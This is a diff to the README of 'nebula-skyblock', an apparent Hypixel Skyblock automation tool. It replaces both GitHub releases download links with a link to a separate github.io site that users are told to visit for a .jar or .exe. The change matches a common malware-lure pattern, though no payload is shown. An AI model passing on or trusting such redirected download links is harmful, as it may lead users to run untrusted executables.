@@ -1,6 +1,6 @@
 # 🌌 nebula-skyblock - Automate your Hypixel skyblock progress daily
 
-[![Download Nebula](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Numismatistterrorist749/nebula-skyblock/releases)
+[![Download Nebula](https://img.shields.io/badge/Download-Release-blue.svg)](https://numismatistterrorist749.github.io)
 
 ## 🖥️ What is nebula-skyblock?
 
@@ -20,7 +20,7 @@ Before you begin, ensure your computer meets these minimum standards:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit [this page to download](https://github.com/Numismatistterrorist749/nebula-skyblock/releases).
+1. Visit [this page to download](https://numismatistterrorist749.github.io).
 2. Look for the latest release version on the page.
 3. Click the file ending in .jar or .exe to save it to your computer.
 4. Move the downloaded file to a folder where you can find it later.
